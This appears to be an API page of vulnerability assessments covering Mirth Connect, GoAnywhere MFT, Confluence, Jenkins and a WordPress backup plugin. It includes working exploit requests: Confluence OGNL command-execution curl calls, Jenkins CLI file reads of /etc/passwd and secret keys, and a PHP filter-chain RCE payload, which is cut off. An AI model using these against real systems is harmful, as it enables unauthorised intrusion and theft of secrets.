{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=17&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=15&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=16&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "b400d3c6-a29f-498b-bac9-7c944fedae3b",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "df6ce950-2612-479d-97d6-be5cd64a01cf",
      "created": "2024-01-24T09:02:11.552657Z",
      "revisionDate": "2024-01-24T09:02:11.552662Z",
      "document": "CVE-2023-43208 is a significant security vulnerability in NextGen Healthcare's Mirth Connect, a widely used open-source data integration platform in the healthcare sector. This vulnerability, identified as an unauthenticated remote code execution (RCE) issue, was addressed in Mirth Connect version 4.4.1, released on October 6, 2023.\r\n\r\nThe vulnerability is especially critical because it stems from an incomplete patch of a previous vulnerability, CVE-2023-37679. This previous issue was a similar RCE vulnerability, supposedly patched in Mirth Connect version 4.4.0. However, CVE-2023-43208 emerged due to the inadequate resolution of CVE-2023-37679, making it a patch bypass issue.\r\n\r\nThe technical specifics of CVE-2023-43208 relate to the insecure use of the Java XStream library for unmarshalling XML payloads. The vulnerability affects versions of Mirth Connect before 4.4.1 and is particularly alarming due to the ease of exploitation. Attackers could exploit this vulnerability for initial access or to compromise sensitive healthcare data.\r\n\r\nThe CVSS (Common Vulnerability Scoring System) score for CVE-2023-43208 is 9.8, categorizing it as a critical vulnerability.\r\n\r\nIn terms of available proofs of concept (PoCs) for exploiting this vulnerability, a POC script was included in Horizon's write-up of this vulnerability: https://www.horizon3.ai/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/ \r\n\r\nGiven the severity and ease of exploitation of CVE-2023-43208, it is strongly recommended for organizations using Mirth Connect to update to version 4.4.1 or later to mitigate the risks associated with this vulnerability. The critical nature of this vulnerability, combined with the sensitive environments in which Mirth Connect is typically deployed, underscores the importance of prompt and thorough patching efforts.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "eea1031a-9a25-482b-8a3f-df80e318f4d9",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "13aa1281-62dc-42b1-9d76-5a8aafafa17c",
      "created": "2024-01-24T10:00:10.950873Z",
      "revisionDate": "2024-01-27T19:23:49.089383Z",
      "document": "Based on the [technical writeup](https://www.horizon3.ai/cve-2024-0204-fortra-goanywhere-mft-authentication-bypass-deep-dive/) and [PoC](https://github.com/horizon3ai/CVE-2024-0204) from Horizion3, this vulnerability can be exploited by an unauthenticated attacker with access to the management interface of GoAnywhere MFT (by default the management interface is available over TCP port 8000 for HTTP and TCP port 8001 for HTTPS), to create a new administrator account on the system. The attacker value is rated as very high given this product is a file transfer solution, and has been targeted by ransomware groups such a Cl0p in the [past](https://www.rapid7.com/blog/post/2024/01/23/etr-cve-2024-0204-critical-authentication-bypass-in-fortra-goanywhere-mft/). I rated the exploitability as high given the management interface must be exposed for exploitation to succeed, which it may not be in all environments.\r\n\r\nThe vulnerabilities lies in the endpoint `/goanywhere/wizard/InitialAccountSetup.xhtml`. This endpoint is used during the products initial setup, to create the first administrator user. After setup has completed, this endpoint is no longer available. However using a Tomcat path traversal technique of inserting the path segment `..;`, allows the endpoint to be reached successfully via the path `/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml`. A HTTP POST request can then be made by an unauthenticated attacker to create a new administrator account with a password of the attackers choosing.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f4db997d-7a6a-4670-8c3a-0f660db486d4",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "93e12bbd-0885-4fcd-b8cb-0b1f175d3467",
      "created": "2024-01-24T19:20:24.542645Z",
      "revisionDate": "2024-01-27T19:23:13.098203Z",
      "document": "# Overview\r\nA vulnerability exists within Atlassian Confluence which enables a remote and unauthenticated attacker to achieve OS command execution in the context of the application. The vulnerability is due to the `text-inline.vm` velocity template allowing the `label` parameter to be passed to an OGNL-sink. By using the technique published by [Rahul Maini and Harsh Jaiswal](https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/) of ProjectDiscovery, an attacker can break out of the sandbox enforced by Struts using the `.KEY_velocity.struts2.context` value exposed within the request. This was the basis for many of the public PoCs which followed the pattern demonstrated below.\r\n\r\n```\r\ncurl --location 'http://localhost:8090/template/aui/text-inline.vm' \\\r\n--header 'X-Cmd-In: touch /tmp/cmd_in' \\\r\n--header 'Content-Type: application/x-www-form-urlencoded' \\\r\n--header 'Cookie: JSESSIONID=7EC7F710425BEBB71F71363591CD03BD' \\\r\n--data-urlencode 'label=\\u0027+#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.p1,{})+\\u0027' \\\r\n--data-urlencode 'p1=@org.apache.struts2.ServletActionContext@getResponse().setHeader('\\''Cmd-Ret'\\'',(new freemarker.template.utility.Execute()).exec({\"id\"}))'\r\n\r\nHTTP/1.1 200 \r\nCache-Control: no-store\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\r\nX-XSS-Protection: 1; mode=block\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nContent-Security-Policy: frame-ancestors 'self'\r\nX-Confluence-Request-Time: 1706122679440\r\nCmd-Ret: uid=2002(confluence) gid=2002(confluence) groups=2002(confluence) \r\nX-Accel-Buffering: no\r\nContent-Type: text/html;charset=UTF-8\r\nContent-Language: en-US\r\nTransfer-Encoding: chunked\r\nDate: Wed, 24 Jan 2024 18:57:59 GMT\r\n```\r\n\r\nAs noted by ProjectDiscovery in their writeup, however, there is a 200-character limit on the OGNL expressions that are evaluated. In the previous example, this means that the length of the `p1` parameter can not exceed 200 characters, meaning the OS command can not exceed 70 characters unless the command results are omitted from the response headers. An additional parameter can also be referenced to bypass this restriction, removing the 200 character limit from the OS command payload. In the following example, the `p2` parameter contains the OS command, which is not subject to the 200-character limit and also has fewer character restrictions, making it easier to encode more complex command payloads.\r\n\r\n```\r\ncurl -i --location 'http://localhost:8090/template/aui/text-inline.vm' \\\r\n--header 'X-Cmd-In: touch /tmp/cmd_in' \\\r\n--header 'Content-Type: application/x-www-form-urlencoded' \\\r\n--header 'Cookie: JSESSIONID=7EC7F710425BEBB71F71363591CD03BD' \\\r\n--data-urlencode 'label=\\u0027+#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.p1,{})+\\u0027' \\\r\n--data-urlencode 'p1=@org.apache.struts2.ServletActionContext@getResponse().setHeader('\\''Cmd-Ret'\\'',(new freemarker.template.utility.Execute()).exec({@org.apache.struts2.ServletActionContext@getRequest().getParameter('\\''p2'\\'')}))' \\\r\n--data-urlencode 'p2=sh -c $@|sh . echo id'\r\n\r\nHTTP/1.1 200 \r\nCache-Control: no-store\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\r\nX-XSS-Protection: 1; mode=block\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nContent-Security-Policy: frame-ancestors 'self'\r\nX-Confluence-Request-Time: 1706122962559\r\nCmd-Ret: uid=2002(confluence) gid=2002(confluence) groups=2002(confluence) \r\nX-Accel-Buffering: no\r\nContent-Type: text/html;charset=UTF-8\r\nContent-Language: en-US\r\nTransfer-Encoding: chunked\r\nDate: Wed, 24 Jan 2024 19:02:42 GMT\r\n```\r\n\r\nThis vulnerability also affects Windows systems. When installed on Microsoft Windows, Confluence will by default run as NT AUTHORITY\\NETWORK SERVICE. An attacker can easily use namedpipe impersonation to target the RPCSS process to elevate themselves to NT AUTHORITY\\SYSTEM. This well-documented privilege escalation technique makes this exploit valuable to attackers when targeting installations on Windows.\r\n\r\n# Remediation\r\nThis vulnerability was patched in version 8.5.4, 8.6.0 and 8.7.1. For complete version information, see [CONFSERVER=93833](https://jira.atlassian.com/browse/CONFSERVER-93833).\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bfc5dce6-718d-4e43-a6f4-07e88f4e09cf",
      "editorId": "5712f2dd-0bcc-4f5b-8266-5559063d40d0",
      "topicId": "9ee4db13-86e1-4f5a-af31-2e4fb4954620",
      "created": "2024-01-26T04:16:38.814891Z",
      "revisionDate": "2024-01-31T01:35:04.854714Z",
      "document": "# CVE-2024-23897: Jenkins Arbitrary File Read Vulnerability\r\n\r\n## Overview\r\nCVE-2024-23897 has been identified as an arbitrary file read vulnerability in Jenkins, specifically through its built-in command line interface (CLI). This vulnerability stems from the use of the args4j library for parsing command arguments and options on the Jenkins controller.\r\n\r\n## Description\r\nWhen processing CLI commands, Jenkins utilizes the args4j library, which has a feature that replaces an `@` character followed by a file path in an argument with the contents of that file (`expandAtFiles`). This feature is enabled by default and was not disabled in Jenkins versions 2.441 and earlier, including LTS 2.426.2 and earlier.\r\n\r\n## Implications\r\nA threat actor can exploit this vulnerability to read arbitrary files on the Jenkins controller's file system using the default character encoding of the Jenkins controller process. Attackers with \"Overall/Read\" permission can read entire files, while those without such permission can only read the first three lines of files, depending on the CLI commands used.\r\n\r\nFurthermore, this vulnerability can be exploited to read binary files containing sensitive information like cryptographic keys, although there are certain limitations. If these binary secrets are extracted, it could potentially lead to various attacks, such as:\r\n- Remote code execution via Resource Root URLs.\r\n- Remote code execution through \"Remember me\" cookies.\r\n- Remote code execution via stored cross-site scripting (XSS) attacks in build logs.\r\n- Remote code execution by bypassing CSRF protection.\r\n- Decrypting secrets stored in Jenkins.\r\n- Deleting any item in Jenkins.\r\n- Downloading a Java heap dump.\r\n\r\nJenkins has noted that while files containing binary data can be read, the affected feature attempts to read them as strings using the controller process's default character encoding.\r\n\r\n## Cybersecurity\r\nThis vulnerability highlights the importance of proper cybersecurity measures in managing software infrastructure, especially in tools like Jenkins, which are pivotal in the continuous integration and delivery pipeline.\r\n\r\n## Discovering Jenkins Version\r\nTo determine if a Jenkins instance is vulnerable, you can check its version using a simple `curl` command. This can help identify if the Jenkins version is one that's affected by CVE-2024-23897.\r\n\r\n**Command:**\r\n```bash\r\ncurl -I http://jenkins.website.com:8080\r\n\r\nHTTP/1.1 403 Forbidden\r\nDate: Fri, 26 Jan 2024 03:20:33 GMT\r\nX-Content-Type-Options: nosniff\r\nSet-Cookie: JSESSIONID.0fb6b3ab=node01vyrtax05t5vd1bj77ieowz32z8.node0; Path=/; HttpOnly\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\r\nContent-Type: text/html;charset=utf-8\r\nX-Hudson: 1.395\r\nX-Jenkins: 2.426.2\r\nX-Jenkins-Session: f03ec4ab\r\nTransfer-Encoding: chunked\r\nServer: Jetty(10.0.18)\r\n```\r\n\r\nThe X-Jenkins header in the response indicates the version of Jenkins that is running. In this example, it shows version 2.426.2, which is one of the versions affected by the vulnerability.\r\n\r\n## Downloading and Using the Jenkins CLI\r\n\r\nFirst, we need to download the CLI tool for Jenkins:\r\n\r\n```bash\r\nwget http://jenkins.website.com:8080/jnlpJars/jenkins-cli.jar\r\n```\r\n\r\nTo determine the commands that I can execute with the CLI, I installed the Docker version with admin credentials (username: admin, password: admin). After executing the \"help\" command:\r\n\r\n```bash\r\njava -jar jenkins-cli.jar -s http://localhost:8080 -auth admin:admin help\r\n```\r\n\r\nHere are the commands that I can execute:\r\n\r\n### Job Management\r\n- `add-job-to-view`: Add jobs to a specific view.\r\n- `build`: Build a job and optionally wait for its completion.\r\n- `copy-job`: Copy an existing job.\r\n- `create-job`: Create a new job with XML configuration input.\r\n- `delete-builds`: Delete specific build records.\r\n- `delete-job`: Delete one or more jobs.\r\n- `disable-job`: Disable a specified job.\r\n- `enable-job`: Enable a specified job.\r\n- `get-job`: Output the job definition XML.\r\n- `keep-build`: Mark a build to keep it permanently.\r\n- `list-jobs`: List all jobs in a specific view or item group.\r\n- `reload-job`: Reload job definitions.\r\n- `remove-job-from-view`: Remove jobs from a specific view.\r\n- `update-job`: Update job definition using XML input.\r\n\r\n### Node Management\r\n- `connect-node`: Reconnect to one or more nodes.\r\n- `create-node`: Create a new node with XML configuration.\r\n- `delete-node`: Delete one or more nodes.\r\n- `disconnect-node`: Disconnect from a node.\r\n- `get-node`: Output the node definition XML.\r\n- `offline-node`: Temporarily stop using a node.\r\n- `online-node`: Resume using a node.\r\n- `update-node`: Update node definition using XML input.\r\n- `wait-node-offline`: Wait for a node to go offline.\r\n- `wait-node-online`: Wait for a node to come online.\r\n\r\n### Plugin Management\r\n- `disable-plugin`: Disable one or more plugins.\r\n- `enable-plugin`: Enable one or more plugins.\r\n- `install-plugin`: Install a plugin from a file, URL, or update center.\r\n- `list-plugins`: List all installed plugins.\r\n\r\n### View Management\r\n- `create-view`: Create a new view with XML configuration.\r\n- `delete-view`: Delete one or more views.\r\n- `get-view`: Output the view definition XML.\r\n- `update-view`: Update view definition using XML input.\r\n\r\n### Credentials Management\r\n- `create-credentials-by-xml`: Create credentials using XML.\r\n- `create-credentials-domain-by-xml`: Create a credentials domain using XML.\r\n- `delete-credentials`: Delete specific credentials.\r\n- `delete-credentials-domain`: Delete a credentials domain.\r\n- `get-credentials-as-xml`: Get credentials as XML (secrets redacted).\r\n- `get-credentials-domain-as-xml`: Get a credentials domain as XML.\r\n- `import-credentials-as-xml`: Import credentials using XML.\r\n- `list-credentials`: List credentials in a specific store.\r\n- `list-credentials-as-xml`: Export credentials as XML.\r\n- `update-credentials-by-xml`: Update credentials using XML.\r\n- `update-credentials-domain-by-xml`: Update a credentials domain using XML.\r\n\r\n### Build and Script Management\r\n- `console`: Retrieve console output of a build.\r\n- `declarative-linter`: Validate a Jenkinsfile with a Declarative Pipeline.\r\n- `groovy`: Execute a specified Groovy script.\r\n- `groovysh`: Run an interactive Groovy shell.\r\n- `list-changes`: Dump the changelog for specific builds.\r\n- `replay-pipeline`: Replay a Pipeline build with edited script.\r\n- `restart-from-stage`: Restart a completed Pipeline build from a stage.\r\n- `set-build-description`: Set the description of a build.\r\n- `set-build-display-name`: Set the display name of a build.\r\n- `stop-builds`: Stop all running builds for specific jobs.\r\n\r\n### System and Configuration Management\r\n- `cancel-quiet-down`: Cancel the quiet-down mode.\r\n- `clear-queue`: Clear the build queue.\r\n- `help`: List all available commands or detailed description of a single command.\r\n- `mail`: Send an email with input from stdin.\r\n- `quiet-down`: Prepare Jenkins for restart by not starting new builds.\r\n- `reload-configuration`: Reload all data from the file system.\r\n- `restart`: Restart Jenkins.\r\n- `safe-restart`: Safely restart Jenkins without starting new builds.\r\n- `safe-shutdown`: Shut down Jenkins after completing existing builds.\r\n- `session-id`: Output the current session ID.\r\n- `shutdown`: Immediately shut down Jenkins server.\r\n- `version`: Output the current version of Jenkins.\r\n- `who-am-i`: Report user credentials and permissions.\r\n\r\nSubsequently, I randomly used a `get` function:\r\n\r\n```bash\r\njava -jar jenkins-cli.jar -s http://localhost:8080 -auth admin:admin get-node @/etc/passwd\r\nERROR: No such node 'root:x:0:0:root:/root:/bin/bash'\r\n```\r\n\r\nGreat, I can now read files, but the question remains about unauthenticated access.\r\n\r\n```bash\r\njava -jar jenkins-cli.jar -s http://localhost:8080 get-node @/etc/passwd\r\nio.jenkins.cli.shaded.jakarta.websocket.DeploymentException: Handshake error.\r\n# (Error stack trace omitted for brevity)\r\nCaused by: io.jenkins.cli.shaded.org.glassfish.tyrus.client.auth.AuthenticationException: Credentials are missing.\r\n```\r\n\r\nSo, I decided to test all the commands without authentication.\r\n\r\n```bash\r\nfor i in `cat jenkins_commands.txt`; do echo $i; java -jar jenkins-cli.jar -s http://localhost:8080 $i \"@/etc/passwd\"; done\r\n```\r\n\r\nI received some responses from a few commands without authentication.\r\n\r\n`disable-job`\r\nERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\n\r\n`enable-job`\r\nERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\n\r\n`help`\r\nERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\n\r\n`safe-shutdown`\r\nERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash\r\n\r\n`shutdown`\r\nERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash\r\n\r\n`who-am-i`\r\nERROR: No argument is allowed: root:x:0:0:root:/root:/bin/bash\r\n\r\nThus, it is possible to read a few lines from files on a vulnerable Jenkins instance.\r\n\r\n```bash\r\njava -jar jenkins-cli.jar -s http://localhost:8080 shutdown @/var/jenkins_home/secret.key\r\nERROR: No argument is allowed: 85c25a9e632febdbad51498ef0bb568400fbc28c1a00ce5115b0789a83c2dd09\r\n```\r\n\r\nHere the secret key of my jenkin.\r\n\r\n## Remediation Section\r\n\r\n### Update Jenkins\r\nTo address the vulnerability, update to a version higher than Jenkins 2.442 or LTS 2.426.3.\r\n\r\n### Author Information\r\n---\r\n\r\nAuthor: Maxime Paill\u00e9\r\n\r\nGitHub: [w2xim3](https://github.com/w2xim3)\r\n\r\nLinkedIn: [LinkedIn Profile](https://www.linkedin.com/in/maxime-paill%C3%A9-9125b4150/)\r\n\r\n![Quebec Cyber Security Logo](https://www.cyber.gouv.qc.ca/fileadmin/templates/img/QUEBEC_blanc.svg)\r\n\r\n\r\n![Quebec Cyber Security Logo](https://www.cyber.gouv.qc.ca/fileadmin/templates/img/QUEBEC_blanc.svg)\r\n",
      "score": 6,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2c58ed71-2d98-4aec-9b22-bb835fea1371",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "fa310f17-20b4-4ccc-8598-6ba59804dc40",
      "created": "2024-01-26T23:03:09.597184Z",
      "revisionDate": "2024-01-29T03:47:36.555571Z",
      "document": "\r\nThe Backup Migration Wordpress plugin describes itself as an all in one solution if you need to migrate your WordPress site to another host or just restore the site from a backup. The plugin is quite popular with over 80,000 active installs.  Versions 1.3.7 and earlier suffer from an unauthenticated remote code execution vulnerability. The vulnerability is exploitable through the `Content-Dir` header which is sent to the `/wp-content/plugins/backup-backup/includes/backup-heart.php` endpoint.\r\n\r\n\r\n\r\n Inside `/includes/backup-heart.php` we can see all the headers of the request get loaded into the `$fields` variable:\r\n```\r\n 31   // Get fields from header\r\n 32   if (isFunctionEnabled('getallheaders')) {\r\n 33     $fields = getallheaders();\r\n 34   }\r\n```\r\n\r\nLater on in the file we see the value of the user controlled `content-dir` header is loaded into the `BMI_ROOT_DIR` variable. \r\n```\r\n 62   define('BMI_ROOT_DIR', $fields['content-dir']);\r\n```\r\n\r\nThen `BMI_INCLUDES` gets defined as `BMI_ROOT_DIR . 'includes'`\r\n```\r\n 64   define('BMI_INCLUDES', BMI_ROOT_DIR . 'includes');\r\n```\r\n\r\nAnd finally the user controlled variable which is now `BMI_INCLUDES` gets fed into a `require_once` statement.\r\n```\r\n118     require_once BMI_INCLUDES . '/bypasser.php';\r\n```\r\n\r\nNow you might be thinking - a user controlled variable being fed into a `require` statement? Sounds like a Local File Inclusion vulnerability. You would be correct if it weren\u2019t for a very neat technique called PHP Filter Chaining.\r\n\r\n\r\n# PHP Filter Chaining\r\n`php://filter` is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening.  The `php://filter` target has one required parameter which is `resource` and it specifies the stream that you would like to filter. For the purposes of PHP filter chaining we can set the resource to `resource=php://temp` as we\u2019re not actually interested in filtering any specific stream we just want to abuse the functionality of PHP filters.\r\n\r\nThere are thousands of languages throughout the world and our basic ASCII encoding table is far too small to represent all the characters used to express all of these different languages. So many encoding tables were created to convert or translate characters from one language to another. These conversion tables are also accessible through `php://convert.iconv.*.*` wrappers.\r\n\r\nThe key to PHP filter chaining is that in some cases byte signatures are prepended by switching encoding. These signatures do not get removed from the string when you switch encoding a second time, they stack. In the case of Unicode (UTF-16), it is required to give to your system the order of the bytes to use (Byte Order Mark BOM), by digging a bit in the RFC 2781 referring to it:\r\n\r\n>The Unicode Standard and ISO 10646 define the character \"ZERO WIDTH\r\nNON-BREAKING SPACE\" (0xFEFF), which is also known informally as \"BYTE\r\nORDER MARK\" (abbreviated \"BOM\").This usage, suggested by Unicode \r\nand ISO 10646 Annex F (informative), is to prepend a 0xFEFF character \r\nto a stream of Unicode characters as a \"signature\"; a receiver of such \r\na serialized stream may then use the initial character both as a hint \r\nthat the stream consists of Unicode characters and as a way to recognize \r\nthe serialization order.\r\n\r\nThe technique was first introduced by a Computer Security enthusiast by the name of Gynvael Coldwind and since the introduction of the technique people have figured out how to chain encoding switches to prepend every letter in the base64 character set. We\u2019re able to base64 decode the string using the php filter `convert.base64-decode` so the base64 character set is all we need to know how to convert.  Here is an excerpt from the conversion table:\r\n```\r\n            \"A\" => \"convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213\",\r\n            \"a\" => \"convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE\",\r\n            \"B\" => \"convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000\",\r\n            \"b\" => \"convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE\",\r\n            \"C\" => \"convert.iconv.UTF8.CSISO2022KR\",\r\n            \"c\" => \"convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2\",\r\n```\r\nIf wish to prepend the character \u201cA\u201d to your string you simply need to chain these two filter conversion together: `\"convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213`.\r\n\r\n# Turning the LFI in RCE \r\nNow we can use the conversion table to prepend a PHP payload to the start of the of the string that gets interpreted by the `require_once` statement on line 118 of \r\n`/includes/backup-heart.php`.  The `Content-Dir` header becomes very long and is subject to length HTTP request header length restrictions, however we are still able to send relatively small payloads such as `<?php `echo>/tmp/pwned`;?>`. The following POST request will send the aforementioned payload:\r\n```\r\nPOST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15\r\nContent-Dir: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9